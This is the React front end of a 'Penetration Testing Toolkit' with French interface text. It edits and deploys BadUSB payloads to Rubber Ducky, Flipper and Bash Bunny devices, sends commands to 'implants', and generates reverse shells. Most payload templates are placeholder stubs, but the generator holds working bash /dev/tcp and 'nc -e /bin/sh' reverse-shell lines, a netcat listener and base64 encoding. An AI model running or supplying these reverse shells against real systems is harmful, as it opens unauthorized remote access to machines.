import React, { useEffect, useState } from 'react';
import axios from 'axios';

function App() {
    const [payloads, setPayloads] = useState([]);
    const [implants] = useState([]);
    const [editor, setEditor] = useState('');
    const [selectedImplant, setSelectedImplant] = useState(null);
    const [shellOutput, setShellOutput] = useState('');
    const [activeTab, setActiveTab] = useState('editor');
    const [activeHardware, setActiveHardware] = useState('rubberducky');
    const [hardware, setHardware] = useState({ volumes: [] });
    const [hardwareLoading, setHardwareLoading] = useState(false);
    const [deployStatus, setDeployStatus] = useState('');
    const [autoEject, setAutoEject] = useState(false);
    const [toasts, setToasts] = useState([]);
    
    const [revShellType, setRevShellType] = useState('powershell');
    const [revShellIP, setRevShellIP] = useState('');
    const [revShellPort, setRevShellPort] = useState('4444');
    const [revShellEncoding, setRevShellEncoding] = useState('none');
    const [generatedShell, setGeneratedShell] = useState('');
    const [flipperFileName, setFlipperFileName] = useState('payload');
    const [bashBunnySlot, setBashBunnySlot] = useState('switch1');

    const templates = {
        reverse_shell: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -nop -w hidden\nENTER',
        privilege_escalation: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb RunAs\nENTER',
        persistence: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell schtasks /create\nENTER',
        keylogger: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell keylogger\nENTER',
        enum_system: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell whoami\nENTER',
        uac_bypass: 'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell UAC bypass\nENTER'
    };

    const reverseShellTemplates = {
        powershell: { name: 'PowerShell', platform: 'Windows', generate: (ip, p) => 'powershell shell ' + ip + ':' + p },
        bash: { name: 'Bash', platform: 'Linux/Mac', generate: (ip, p) => 'bash -i >& /dev/tcp/' + ip + '/' + p + ' 0>&1' },
        python: { name: 'Python', platform: 'Cross-platform', generate: (ip, p) => 'python shell ' + ip + ':' + p },
        php: { name: 'PHP', platform: 'Web', generate: (ip, p) => 'php shell ' + ip + ':' + p },
        netcat: { name: 'Netcat', platform: 'Linux', generate: (ip, p) => 'nc -e /bin/sh ' + ip + ' ' + p },
        ruby: { name: 'Ruby', platform: 'Cross-platform', generate: (ip, p) => 'ruby shell ' + ip + ':' + p },
        perl: { name: 'Perl', platform: 'Cross-platform', generate: (ip, p) => 'perl shell ' + ip + ':' + p },
        java: { name: 'Java', platform: 'Cross-platform', generate: (ip, p) => 'java shell ' + ip + ':' + p },
        nodejs: { name: 'Node.js', platform: 'Cross-platform', generate: (ip, p) => 'node shell ' + ip + ':' + p }
    };

    const generateReverseShell = () => {
        if (!revShellIP || !revShellPort) {
            alert('Please enter IP and Port');
            return;
        }
        const template = reverseShellTemplates[revShellType];
        let shell = template.generate(revShellIP, revShellPort);
        if (revShellEncoding === 'base64') {
            shell = 'base64: ' + btoa(shell);
        }
        setGeneratedShell(shell);
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        alert('Copied!');
    };

    const compilePayload = async () => {
        try {
            await axios.post('http://localhost:3001/compile', { name: 'payload_' + Date.now(), payload: editor });
            alert('Compiled!');
            setPayloads([...payloads, { name: 'payload.bin', date: new Date().toLocaleString() }]);
        } catch (e) {
            alert('Error: ' + e.message);
        }
    };

    const executeShell = async (command) => {
        if (!selectedImplant) {
            alert('Select a target!');
            return;
        }
        try {
            await axios.post('http://localhost:3001/shell/' + selectedImplant.id + '/execute', { command });
            setShellOutput(prev => prev + '\n$ ' + command + '\nExecuted');
        } catch (e) {
            setShellOutput(prev => prev + '\nError: ' + e.message);
        }
    };

    const addToast = (msg, type = 'info') => {
        const id = Date.now() + Math.random();
        setToasts(prev => [...prev, { id, msg, type }]);
        setTimeout(() => {
            setToasts(prev => prev.filter(t => t.id !== id));
        }, 3500);
    };

    const fetchHardware = async () => {
        setHardwareLoading(true);
        setDeployStatus('');
        try {
            const { data } = await axios.get('http://localhost:3001/hardware/list');
            setHardware(data || { volumes: [] });
        } catch (e) {
            setHardware({ volumes: [] });
        } finally {
            setHardwareLoading(false);
        }
    };

    useEffect(() => {
        // Rafraîchir la liste des volumes quand on sélectionne un hardware
        fetchHardware();
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [activeHardware]);

    useEffect(() => {
        // Rafraîchissement périodique uniquement sur l’onglet Hardware
        if (activeTab === 'hardware') {
            const id = setInterval(() => fetchHardware(), 5000);
            return () => clearInterval(id);
        }
    }, [activeTab]);

    const deployToRubberDucky = async () => {
        setDeployStatus('');
        if (!editor || editor.trim().length === 0) {
            alert('Entrez un payload Rubber Ducky avant de déployer.');
            return;
        }
        try {
            const { data } = await axios.post('http://localhost:3001/rubberducky/deploy', { payload: editor });
            if (data && data.success) {
                setDeployStatus('Déployé sur ' + (data.mountpoint || 'Volume') + ' → ' + (data.path || 'payload.txt'));
                addToast('Déployé (Rubber Ducky): ' + (data.path || 'payload.txt'), 'success');
                if (autoEject && data.mountpoint) {
                    await ejectVolume(data.mountpoint);
                }
            } else {
                setDeployStatus('Échec: ' + (data.error || 'inconnu'));
                addToast('Échec déploiement Rubber Ducky: ' + (data.error || 'inconnu'), 'error');
            }
        } catch (e) {
            setDeployStatus('Erreur: ' + e.message);
            addToast('Erreur déploiement: ' + e.message, 'error');
        }
    };

    const openInFinder = async (mountpoint) => {
        try {
            await axios.post('http://localhost:3001/hardware/open', { mountpoint });
            setDeployStatus('Ouvert dans Finder: ' + mountpoint);
            addToast('Ouvert dans Finder', 'info');
        } catch (e) {
            setDeployStatus('Erreur ouverture: ' + e.message);
            addToast('Erreur ouverture: ' + e.message, 'error');
        }
    };

    const ejectVolume = async (mountpoint) => {
        try {
            await axios.post('http://localhost:3001/hardware/eject', { mountpoint });
            setDeployStatus('Éjecté: ' + mountpoint);
            fetchHardware();
            addToast('Volume éjecté', 'success');
        } catch (e) {
            setDeployStatus('Erreur éjection: ' + e.message);
            addToast('Erreur éjection: ' + e.message, 'error');
        }
    };

    return (
        <div className="min-h-screen bg-gray-50">
            <div className="bg-white border-b shadow-sm">
                <div className="max-w-7xl mx-auto px-6 py-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center">
                                <span className="text-2xl">🛡️</span>
                            </div>
                            <div>
                                <h1 className="text-xl font-semibold">Penetration Testing Toolkit</h1>
                                <p className="text-xs text-gray-500">Hardware & Software Security Platform</p>
                            </div>
                        </div>
                        <div className="flex items-center gap-4">
                            <div className="px-3 py-1.5 bg-green-50 border border-green-200 rounded-lg">
                                <span className="text-sm font-medium text-green-700">{implants.length} Active</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="max-w-7xl mx-auto p-6">
                <div className="grid grid-cols-12 gap-6">
                    <div className="col-span-3">
                        <div className="bg-white rounded-xl shadow-sm border">
                            <div className="p-4 border-b bg-gray-50">
                                <h2 className="text-sm font-semibold text-gray-700">HARDWARE TOOLS</h2>
                            </div>
                            <div className="p-2">
                                {['rubberducky', 'flipper', 'bashbunny', 'pineapple', 'lanturtle', 'packetsquirrel'].map(hw => (
                                    <button key={hw} onClick={() => setActiveHardware(hw)}
                                        className={'w-full text-left px-4 py-3 rounded-lg flex items-center gap-3 ' + (activeHardware === hw ? 'bg-blue-50 text-blue-700 font-medium' : 'text-gray-600 hover:bg-gray-50')}>
                                        <span className="text-xl">
                                            {hw === 'rubberducky' ? '🦆' : hw === 'flipper' ? '🐬' : hw === 'bashbunny' ? '🐰' : hw === 'pineapple' ? '🍍' : hw === 'lanturtle' ? '🐢' : '🐿️'}
                                        </span>
                                        <span className="capitalize">{hw.replace('rubberducky', 'Rubber Ducky').replace('bashbunny', 'Bash Bunny').replace('pineapple', 'WiFi Pineapple').replace('lanturtle', 'LAN Turtle').replace('packetsquirrel', 'Packet Squirrel')}</span>
                                    </button>
                                ))}
                            </div>
                            {activeHardware === 'rubberducky' && (
                                <div className="p-4 border-t bg-gray-50">
                                    <h2 className="text-sm font-semibold text-gray-700 mb-3">RUBBER DUCKY CONNECTÉ</h2>
                                    <div className="flex items-center gap-2 mb-3">
                                        <button onClick={fetchHardware} className="px-3 py-1.5 bg-white border rounded-lg text-sm hover:bg-gray-100">Rafraîchir</button>
                                        {hardwareLoading && <span className="text-xs text-gray-500">Recherche...</span>}
                                    </div>
                                    {(hardware?.volumes || []).filter(v => v.type === 'rubberducky' || v.hasInject || v.hasPayloadTxt).length === 0 ? (
                                        <p className="text-xs text-gray-500">Aucun Rubber Ducky détecté. Assurez-vous que le volume est monté dans /Volumes.</p>
                                    ) : (
                                        (hardware.volumes || []).filter(v => v.type === 'rubberducky' || v.hasInject || v.hasPayloadTxt).map((v, i) => (
                                            <div key={i} className="mb-2 p-3 rounded-lg border bg-white">
                                                <div className="text-sm font-medium">{v.name}</div>
                                                <div className="text-xs text-gray-500">{v.mountpoint}</div>
                                                <div className="mt-2 flex gap-2">
                                                    <span className={'px-2 py-0.5 rounded text-xs ' + (v.hasInject ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-700')}>inject.bin {v.hasInject ? 'présent' : 'absent'}</span>
                                                    <span className={'px-2 py-0.5 rounded text-xs ' + (v.hasPayloadTxt ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-700')}>payload.txt {v.hasPayloadTxt ? 'présent' : 'absent'}</span>
                                                </div>
                                            </div>
                                        ))
                                    )}
                                </div>
                            )}
                            
                            <div className="p-4 border-t bg-gray-50">
                                <h2 className="text-sm font-semibold text-gray-700 mb-3">ACTIVE TARGETS</h2>
                            </div>
                            <div className="p-2">
                                {implants.length === 0 ? (
                                    <div className="px-4 py-8 text-center">
                                        <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-2">
                                            <span className="text-2xl">📡</span>
                                        </div>
                                        <p className="text-sm text-gray-500">No active targets</p>
                                    </div>
                                ) : (
                                    implants.map(imp => (
                                        <div key={imp.id} onClick={() => setSelectedImplant(imp)}
                                            className={'mb-2 p-3 rounded-lg border cursor-pointer ' + (selectedImplant?.id === imp.id ? 'bg-blue-50 border-blue-200' : 'bg-white border-gray-200')}>
                                            <div className="flex items-center justify-between mb-1">
                                                <span className="font-mono text-xs font-semibold">{imp.id}</span>
                                                <span className={'px-2 py-0.5 rounded text-xs font-medium ' + (imp.status === 'online' ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700')}>
                                                    {imp.status}
                                                </span>
                                            </div>
                                            <div className="text-xs text-gray-600">
                                                <div>{imp.hostname}</div>
                                                <div className="text-gray-400">{imp.ip}</div>
                                            </div>
                                        </div>
                                    ))
                                )}
                            </div>
                        </div>
                    </div>

                    <div className="col-span-9">
                        <div className="bg-white rounded-xl shadow-sm border">
                            <div className="border-b">
                                <div className="flex gap-1 p-2">
                                        {['editor', 'shell', 'payloadstudio', 'hardware'].map(tab => (
                                        <button key={tab} onClick={() => setActiveTab(tab)}
                                            className={'px-4 py-2 rounded-lg text-sm font-medium ' + (activeTab === tab ? 'bg-blue-50 text-blue-700' : 'text-gray-600 hover:bg-gray-50')}>
                                            {tab === 'editor' ? 'Payload Editor' : tab === 'shell' ? 'Remote Shell' : tab === 'payloadstudio' ? 'Shell Generator' : 'Hardware'}
                                        </button>
                                    ))}
                                </div>
                            </div>

                            <div className="p-6">
                                {activeTab === 'editor' && (
                                    <div>
                                        <h3 className="text-lg font-semibold mb-4">{activeHardware.replace('rubberducky', 'Rubber Ducky').replace('bashbunny', 'Bash Bunny')} Payloads</h3>
                                        <div className="grid grid-cols-3 gap-3 mb-6">
                                            {Object.keys(templates).map(key => (
                                                <button key={key} onClick={() => setEditor(templates[key])}
                                                    className="px-4 py-3 bg-gray-50 hover:bg-blue-50 border rounded-lg text-sm font-medium text-left">
                                                    {key.replace(/_/g, ' ').toUpperCase()}
                                                </button>
                                            ))}
                                        </div>
                                        <textarea value={editor} onChange={(e) => setEditor(e.target.value)}
                                            className="w-full h-80 p-4 bg-gray-50 border rounded-lg font-mono text-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-100 focus:outline-none"
                                            placeholder="Enter your payload..."/>
                                        <div className="grid grid-cols-2 gap-3 mt-4">
                                            <button onClick={compilePayload}
                                                className="w-full bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium">
                                                Compiler
                                            </button>
                                            {activeHardware === 'rubberducky' && (
                                                <button onClick={deployToRubberDucky}
                                                    className="w-full bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-lg font-medium">
                                                    Déployer sur Rubber Ducky
                                                </button>
                                            )}
                                        </div>
                                        {deployStatus && (
                                            <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded text-xs text-green-800">{deployStatus}</div>
                                        )}
                                        {payloads.length > 0 && (
                                            <div className="mt-6 p-4 bg-gray-50 border rounded-lg">
                                                <h4 className="font-semibold mb-3">Compiled Payloads</h4>
                                                {payloads.map((p, i) => (
                                                    <div key={i} className="p-3 bg-white border rounded-lg mb-2">
                                                        <div className="text-sm font-medium">{p.name}</div>
                                                        <div className="text-xs text-gray-500">{p.date}</div>
                                                    </div>
                                                ))}
                                            </div>
                                        )}
                                    </div>
                                )}

                                {activeTab === 'shell' && (
                                    <div>
                                        <h3 className="text-lg font-semibold mb-4">
                                            {selectedImplant ? 'Connected: ' + selectedImplant.hostname : 'Remote Shell Access'}
                                        </h3>
                                        <div className="mb-4 flex gap-2">
                                            <button onClick={() => executeShell('whoami')} className="px-4 py-2 bg-gray-100 hover:bg-gray-200 border rounded-lg text-sm">whoami</button>
                                            <button onClick={() => executeShell('ipconfig')} className="px-4 py-2 bg-gray-100 hover:bg-gray-200 border rounded-lg text-sm">ipconfig</button>
                                            <input type="text" id="customCmd" placeholder="Enter command..."
                                                className="flex-1 px-3 py-2 bg-white border rounded-lg text-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-100 focus:outline-none"
                                                onKeyPress={(e) => { if (e.key === 'Enter') { executeShell(e.target.value); e.target.value = ''; } }}/>
                                        </div>
                                        <div className="bg-gray-900 border rounded-lg p-4 font-mono text-xs h-96 overflow-y-auto">
                                            {shellOutput ? <pre className="text-green-400">{shellOutput}</pre> : <p className="text-gray-500">Waiting for execution...</p>}
                                        </div>
                                    </div>
                                )}

                                {activeTab === 'payloadstudio' && (
                                    <div>
                                        <h3 className="text-lg font-semibold mb-4">Reverse Shell Generator</h3>
                                        <div className="bg-white border rounded-lg p-6 mb-6">
                                            <div className="grid grid-cols-2 gap-4 mb-6">
                                                <div>
                                                    <label className="block text-sm font-medium mb-2">Shell Type</label>
                                                    <select value={revShellType} onChange={(e) => setRevShellType(e.target.value)}
                                                        className="w-full px-3 py-2 bg-white border rounded-lg text-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-100 focus:outline-none">
                                                        {Object.entries(reverseShellTemplates).map(([key, value]) => (
                                                            <option key={key} value={key}>{value.name} ({value.platform})</option>
                                                        ))}
                                                    </select>
                                                </div>
                                                <div>
                                                    <label className="block text-sm font-medium mb-2">Encoding</label>
                                                    <select value={revShellEncoding} onChange={(e) => setRevShellEncoding(e.target.value)}
                                                        className="w-full px-3 py-2 bg-white border rounded-lg text-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-100 focus:outline-none">
                                                        <option value="none">None</option>
                                                        <option value="base64">Base64</option>
                                                    </select>
                                                </div>
                                                <div>
                                                    <label className="block text-sm font-medium mb-2">IP (LHOST)</label>
                                                    <input type="text" value={revShellIP} onChange={(e) => setRevShellIP(e.target.value)}
                                                        placeholder="192.168.1.x" className="w-full px-3 py-2 bg-white border rounded-lg text-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-100 focus:outline-none"/>
                                                </div>
                                                <div>
                                                    <label className="block text-sm font-medium mb-2">Port (LPORT)</label>
                                                    <input type="text" value={revShellPort} onChange={(e) => setRevShellPort(e.target.value)}
                                                        placeholder="4444" className="w-full px-3 py-2 bg-white border rounded-lg text-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-100 focus:outline-none"/>
                                                </div>
                                            </div>
                                            <button onClick={generateReverseShell}
                                                className="w-full bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium">
                                                Generate Shell
                                            </button>
                                        </div>

                                        {generatedShell && (
                                            <div className="bg-white border rounded-lg p-6">
                                                <div className="flex justify-between items-center mb-4">
                                                    <h4 className="font-semibold">Generated Payload</h4>
                                                    <button onClick={() => copyToClipboard(generatedShell)}
                                                        className="px-4 py-2 bg-gray-100 hover:bg-gray-200 border rounded-lg text-sm font-medium">
                                                        Copy
                                                    </button>
                                                </div>
                                                <pre className="bg-gray-900 border rounded-lg p-4 font-mono text-xs text-green-400 overflow-x-auto">{generatedShell}</pre>
                                                <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                                                    <h5 className="font-semibold text-blue-900 mb-2">Listener Command</h5>
                                                    <pre className="bg-gray-900 p-3 rounded text-xs font-mono text-green-400">nc -lvnp {revShellPort}</pre>
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                )}

                                {activeTab === 'hardware' && (
                                    <div>
                                        <div className="flex items-center justify-between mb-4">
                                            <h3 className="text-lg font-semibold">Hardware connecté</h3>
                                            <div className="flex items-center gap-3">
                                                <label className="flex items-center gap-2 text-xs">
                                                    <input type="checkbox" checked={autoEject} onChange={(e) => setAutoEject(e.target.checked)} />
                                                    Éjecter après déploiement
                                                </label>
                                                <button onClick={fetchHardware} className="px-3 py-2 bg-white border rounded-lg text-sm hover:bg-gray-100">Rafraîchir</button>
                                                {hardwareLoading && <span className="text-xs text-gray-500">Recherche...</span>}
                                            </div>
                                        </div>
                                        <div className="grid grid-cols-2 gap-4">
                                            {(hardware?.volumes || []).map((v, i) => (
                                                <div key={i} className="p-4 border rounded-lg bg-white">
                                                    <div className="flex items-center justify-between">
                                                        <div className="flex items-center gap-2">
                                                            <span className="text-xl">{v.type === 'rubberducky' ? '🦆' : v.type === 'flipper' ? '🐬' : v.type === 'bashbunny' ? '🐰' : '💾'}</span>
                                                            <div>
                                                                <div className="text-sm font-semibold">{v.name}</div>
                                                                <div className="text-xs text-gray-500">{v.mountpoint}</div>
                                                            </div>
                                                        </div>
                                                        <span className="px-2 py-1 bg-gray-100 rounded text-xs capitalize">{v.type}</span>
                                                    </div>
                                                    <div className="mt-2 flex gap-2 flex-wrap">
                                                        <span className={'px-2 py-0.5 rounded text-xs ' + (v.hasPayloadTxt ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-700')}>payload.txt {v.hasPayloadTxt ? 'présent' : 'absent'}</span>
                                                        <span className={'px-2 py-0.5 rounded text-xs ' + (v.hasInject ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-700')}>inject.bin {v.hasInject ? 'présent' : 'absent'}</span>
                                                    </div>
                                                    {/* Actions par type */}
                                                    {v.type === 'rubberducky' && (
                                                        <div className="mt-3">
                                                            <button onClick={deployToRubberDucky} className="px-3 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm">Déployer payload.txt</button>
                                                        </div>
                                                    )}
                                                    {v.type === 'flipper' && (
                                                        <div className="mt-3">
                                                            <div className="flex gap-2">
                                                                <input value={flipperFileName} onChange={e => setFlipperFileName(e.target.value)} className="flex-1 px-3 py-2 bg-white border rounded-lg text-sm" placeholder="Nom de fichier"/>
                                                                <button onClick={async () => {
                                                                    setDeployStatus('');
                                                                    try {
                                                                        const { data } = await axios.post('http://localhost:3001/flipper/deploy', { payload: editor, name: flipperFileName });
                                                                        if (data && data.success) {
                                                                            setDeployStatus('Déployé sur ' + (data.path || 'badusb'));
                                                                            addToast('Déployé (Flipper): ' + (data.path || ''), 'success');
                                                                            if (autoEject && data.mountpoint) {
                                                                                await ejectVolume(data.mountpoint);
                                                                            }
                                                                        } else {
                                                                            setDeployStatus('Échec: ' + (data.error || 'inconnu'));
                                                                            addToast('Échec déploiement Flipper: ' + (data.error || 'inconnu'), 'error');
                                                                        }
                                                                    } catch (e) { setDeployStatus('Erreur: ' + e.message); }
                                                                }} className="px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm">Déployer BadUSB</button>
                                                            </div>
                                                        </div>
                                                    )}
                                                    {v.type === 'bashbunny' && (
                                                        <div className="mt-3">
                                                            <div className="flex gap-2">
                                                                <select value={bashBunnySlot} onChange={e => setBashBunnySlot(e.target.value)} className="px-3 py-2 bg-white border rounded-lg text-sm">
                                                                    <option value="switch1">switch1</option>
                                                                    <option value="switch2">switch2</option>
                                                                    <option value="switch3">switch3</option>
                                                                </select>
                                                                <button onClick={async () => {
                                                                    setDeployStatus('');
                                                                    try {
                                                                        const { data } = await axios.post('http://localhost:3001/bashbunny/deploy', { payload: editor, slot: bashBunnySlot });
                                                                        if (data && data.success) {
                                                                            setDeployStatus('Déployé sur ' + (data.path || 'payloads'));
                                                                            addToast('Déployé (Bash Bunny): ' + (data.path || ''), 'success');
                                                                            if (autoEject && data.mountpoint) {
                                                                                await ejectVolume(data.mountpoint);
                                                                            }
                                                                        } else {
                                                                            setDeployStatus('Échec: ' + (data.error || 'inconnu'));
                                                                            addToast('Échec déploiement Bash Bunny: ' + (data.error || 'inconnu'), 'error');
                                                                        }
                                                                    } catch (e) { setDeployStatus('Erreur: ' + e.message); }
                                                                }} className="px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-sm">Déployer Slot</button>
                                                            </div>
                                                        </div>
                                                    )}
                                                    {/* Actions génériques */}
                                                    <div className="mt-3 flex gap-2">
                                                        <button onClick={() => openInFinder(v.mountpoint)} className="px-3 py-2 bg-white border rounded-lg text-sm hover:bg-gray-100">Ouvrir dans Finder</button>
                                                        <button onClick={() => ejectVolume(v.mountpoint)} className="px-3 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg text-sm">Éjecter</button>
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                        {deployStatus && (
                                            <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded text-xs text-green-800">{deployStatus}</div>
                                        )}
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        {/* Toasts */}
        <div className="fixed top-4 right-4 z-50 space-y-2">
            {toasts.map(t => (
                <div key={t.id} className={'px-4 py-2 rounded shadow text-white text-sm ' + (t.type === 'success' ? 'bg-green-600' : t.type === 'error' ? 'bg-red-600' : 'bg-blue-600')}>
                    {t.msg}
                </div>
            ))}
        </div>
        </div>
    );
}

export default App;
